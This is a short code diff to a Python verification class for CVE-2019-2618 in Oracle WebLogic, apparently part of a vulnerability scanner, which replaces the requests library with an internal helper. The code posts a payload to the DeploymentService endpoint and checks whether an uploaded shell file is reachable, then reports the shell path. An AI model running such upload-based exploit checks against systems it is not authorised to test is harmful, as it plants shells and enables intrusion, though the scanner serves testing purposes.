@@ -9,7 +9,7 @@ import os
 import re
 import json
 import time
-import requests
+from app.lib.utils.request import request
 import binascii
 
 class CVE_2019_2618_BaseVerify:
@@ -67,8 +67,8 @@ class CVE_2019_2618_BaseVerify:
             self.url = "http://" + self.url
         try:
             payload_url = self.url + "/bea_wls_deployment_internal/DeploymentService"
-            result = requests.post(payload_url, headers = self.headers, data = self.payload, allow_redirects = False, verify = False)
-            check = requests.get(self.url +  "/bea_wls_deployment_internal/" + self.shell, allow_redirects = False, verify = False)
+            result = request.post(payload_url, headers = self.headers, data = self.payload)
+            check = request.get(self.url +  "/bea_wls_deployment_internal/" + self.shell)
             if check.status_code == 200:
                 print ("存在CVE-2019-2618漏洞，shell文件路径为："+ self.url +"/bea_wls_deployment_internal/" + self.shell)
                 return True
